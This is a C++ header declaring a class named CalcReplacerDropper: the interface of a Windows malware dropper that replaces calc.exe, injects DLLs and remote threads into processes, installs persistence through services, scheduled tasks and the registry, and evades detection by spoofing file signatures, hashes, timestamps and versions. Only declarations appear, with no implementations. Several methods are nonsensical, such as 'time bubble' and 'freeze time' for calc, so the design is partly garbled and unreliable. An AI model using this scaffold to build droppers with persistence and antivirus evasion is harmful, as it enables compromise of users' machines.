#pragma once

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <thread>
#include <atomic>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <random>
#include <algorithm>

#ifdef _WIN32
    #include <windows.h>
    #include <winreg.h>
    #include <shlobj.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <winsvc.h>
    #include <wininet.h>
    #include <crypt32.h>
    #include <wincrypt.h>
    #include <imagehlp.h>
    #include <wintrust.h>
    #include <softpub.h>
    #include <timeapi.h>
    #include <sysinfoapi.h>
    #include <shellapi.h>
    #include <shlwapi.h>
    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "imagehlp.lib")
    #pragma comment(lib, "wintrust.lib")
    #pragma comment(lib, "winmm.lib")
    #pragma comment(lib, "kernel32.lib")
    #pragma comment(lib, "shell32.lib")
    #pragma comment(lib, "shlwapi.lib")
#endif

namespace fs = std::filesystem;

class CalcReplacerDropper {
public:
    CalcReplacerDropper();
    ~CalcReplacerDropper();
    
    // Core dropper functionality
    bool replaceCalcExe();
    bool backupOriginalCalc();
    bool restoreOriginalCalc();
    bool createCalcReplacement();
    bool injectIntoCalc();
    bool hijackCalcProcess();
    
    // Time manipulation integration
    void integrateTimeManipulation();
    void setupThreatResponse();
    void activateTimeManipulationOnThreat();
    void createTimeBubbleAroundCalc();
    void freezeTimeForCalc();
    
    // Advanced replacement techniques
    bool createPolymutCalc();
    bool createMetamutCalc();
    bool createStealthCalc();
    bool createInvisibleCalc();
    bool createGhostCalc();
    
    // Persistence through calc.exe
    bool setupCalcPersistence();
    bool createCalcStartup();
    bool createCalcService();
    bool createCalcTask();
    bool createCalcRegistry();
    
    // Evasion techniques
    bool evadeCalcDetection();
    bool spoofCalcSignature();
    bool spoofCalcHash();
    bool spoofCalcTimestamp();
    bool spoofCalcSize();
    bool spoofCalcVersion();
    
    // Threat detection and response
    void detectCalcThreats();
    void respondToCalcThreats();
    void emergencyCalcReplacement();
    void panicCalcMode();
    
    // Utility methods
    void setCalcReplacementPath(const std::string& path);
    void setBackupPath(const std::string& path);
    void setStealthMode(bool stealth);
    void setTimeManipulationMode(bool enabled);
    
    // Getters
    bool isCalcReplaced() const;
    bool isBackupCreated() const;
    bool isTimeManipulationEnabled() const;
    std::string getCalcReplacementPath() const;
    std::string getBackupPath() const;
    std::string getLastError() const;

private:
    std::string calcReplacementPath;
    std::string backupPath;
    std::string originalCalcPath;
    std::atomic<bool> calcReplaced;
    std::atomic<bool> backupCreated;
    std::atomic<bool> stealthMode;
    std::atomic<bool> timeManipulationEnabled;
    std::string lastError;
    std::random_device rd;
    std::mt19937 gen;
    
    // Threads
    std::thread threatDetectionThread;
    std::thread calcMonitoringThread;
    std::thread timeManipulationThread;
    
    // Internal methods
    void setError(const std::string& error);
    void clearError();
    
    // Core replacement methods
    bool findOriginalCalc();
    bool createCalcBackup();
    bool createCalcReplacementInternal();
    bool injectIntoCalcInternal();
    bool hijackCalcProcessInternal();
    
    // Polymut methods
    bool createPolymutCalcInternal();
    bool createMetamutCalcInternal();
    bool createStealthCalcInternal();
    bool createInvisibleCalcInternal();
    bool createGhostCalcInternal();
    
    // Persistence methods
    bool setupCalcPersistenceInternal();
    bool createCalcStartupInternal();
    bool createCalcServiceInternal();
    bool createCalcTaskInternal();
    bool createCalcRegistryInternal();
    
    // Evasion methods
    bool evadeCalcDetectionInternal();
    bool spoofCalcSignatureInternal();
    bool spoofCalcHashInternal();
    bool spoofCalcTimestampInternal();
    bool spoofCalcSizeInternal();
    bool spoofCalcVersionInternal();
    
    // Threat detection methods
    void detectCalcThreatsInternal();
    void respondToCalcThreatsInternal();
    void emergencyCalcReplacementInternal();
    void panicCalcModeInternal();
    
    // Time manipulation methods
    void integrateTimeManipulationInternal();
    void setupThreatResponseInternal();
    void activateTimeManipulationOnThreatInternal();
    void createTimeBubbleAroundCalcInternal();
    void freezeTimeForCalcInternal();
    
    // Thread methods
    void threatDetectionLoop();
    void calcMonitoringLoop();
    void timeManipulationLoop();
    
    // Utility methods
    std::string getSystemCalcPath();
    std::string generateRandomCalcName();
    std::string generateRandomPath();
    bool isCalcRunning();
    bool killCalcProcess();
    bool waitForCalcExit();
    
    // File manipulation methods
    bool copyFile(const std::string& source, const std::string& destination);
    bool deleteFile(const std::string& filePath);
    bool moveFile(const std::string& source, const std::string& destination);
    bool createDirectory(const std::string& path);
    
    // Process manipulation methods
    bool createProcess(const std::string& command);
    bool terminateProcess(const std::string& processName);
    bool injectDLL(const std::string& processName, const std::string& dllPath);
    bool createRemoteThread(const std::string& processName, void* function, void* parameter);
    
    // Registry manipulation methods
    bool createRegistryKey(const std::string& keyPath);
    bool setRegistryValue(const std::string& keyPath, const std::string& valueName, const std::string& value);
    bool deleteRegistryKey(const std::string& keyPath);
    bool deleteRegistryValue(const std::string& keyPath, const std::string& valueName);
    
    // Service manipulation methods
    bool createService(const std::string& serviceName, const std::string& servicePath);
    bool startService(const std::string& serviceName);
    bool stopService(const std::string& serviceName);
    bool deleteService(const std::string& serviceName);
    
    // Task manipulation methods
    bool createScheduledTask(const std::string& taskName, const std::string& command);
    bool enableScheduledTask(const std::string& taskName);
    bool disableScheduledTask(const std::string& taskName);
    bool deleteScheduledTask(const std::string& taskName);
    
    // Configuration
    std::map<std::string, std::string> calcReplacementModes;
    std::map<std::string, std::string> threatResponseModes;
    std::map<std::string, std::string> evasionModes;
    
    void initializeCalcReplacementModes();
    void initializeThreatResponseModes();
    void initializeEvasionModes();
};